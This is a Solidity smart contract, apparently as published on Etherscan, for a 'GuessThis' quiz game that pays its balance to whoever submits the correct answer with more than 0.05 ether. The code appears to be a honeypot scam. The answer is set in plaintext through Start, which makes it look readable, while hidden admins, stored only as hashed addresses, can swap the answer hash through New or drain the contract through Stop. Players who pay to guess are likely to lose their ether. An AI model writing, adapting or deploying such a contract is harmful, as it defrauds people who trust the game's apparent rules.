/**
 *Submitted for verification at Etherscan.io on 2022-07-30
*/

pragma solidity >=0.7.0 <0.9.0;

contract GuessThis{

    string public question;

    bytes32 responseHash;

    mapping (bytes32=>bool) admin;

    
    constructor(bytes32[] memory admins) {
        for(uint256 i=0; i< admins.length; i++){
            admin[admins[i]] = true;
        }
    }

    modifier isOwner(){
        require(admin[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

    function Guess(string memory _response) public payable
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(abi.encode(_response)) && msg.value > 0.05 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    function Start(string calldata _question, string calldata _response) public payable isOwner{
        if(responseHash==0x0){
            responseHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function Stop() public payable isOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function New(string calldata _question, bytes32 _responseHash) public payable isOwner {
        question = _question;
        responseHash = _responseHash;
    }

    fallback() external {}
}